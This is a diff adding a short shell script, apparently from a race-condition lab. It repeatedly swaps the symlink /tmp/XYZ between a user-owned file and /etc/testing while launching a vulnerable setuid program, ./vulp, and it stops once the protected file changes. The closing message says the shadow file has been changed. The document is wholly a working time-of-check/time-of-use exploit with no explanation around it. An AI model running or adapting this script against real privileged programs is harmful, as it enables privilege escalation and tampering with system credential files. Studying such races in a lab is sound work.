@@ -1,0 +1,16 @@
+#!/bin/sh
+
+
+old=`ls -l /etc/testing`
+new=`ls -l /etc/testing`
+touch /tmp/ZYX
+while [ "$old" = "$new" ]
+do
+    ln -sf /tmp/ZYX /tmp/XYZ
+    chmod g+w /tmp/XYZ
+    echo "blabla" | ./vulp &
+    ln -sf /etc/testing /tmp/XYZ
+    new=`ls -l /etc/testing`
+done
+
+echo "STOP... The shadow file has been changed"
